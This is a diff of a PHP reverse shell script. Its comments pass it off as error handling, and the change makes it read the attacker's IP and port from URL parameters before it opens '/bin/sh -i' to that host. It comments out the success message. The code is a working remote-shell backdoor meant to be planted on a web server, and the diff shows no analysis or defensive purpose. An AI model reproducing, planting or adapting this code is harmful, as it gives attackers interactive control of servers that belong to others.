@@ -1,10 +1,8 @@
 <?php
-// This is where we handle errors
-
+// This is where we will get our variables passed through the URL
 set_time_limit (0);
-$VERSION = "1.0";
-$ip = 'localhost';  // CHANGE THIS
-$port = 12341;       // CHANGE THIS
+$ip = $_GET["ip"];
+$port = $_GET["port"];
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -12,8 +10,6 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
-//
-// Daemonise ourself if possible to avoid zombies later
 //
 
 // pcntl_fork is hardly ever available, but will allow us to daemonise
@@ -81,7 +77,8 @@ stream_set_blocking($pipes[1], 0);
 stream_set_blocking($pipes[2], 0);
 stream_set_blocking($sock, 0);
 
-printit("Successfully captured error to $ip:$port");
+//Debugging purposes only
+//printit("Successfully captured error to $ip:$port");
 
 while (1) {
 	// Check for end of TCP connection
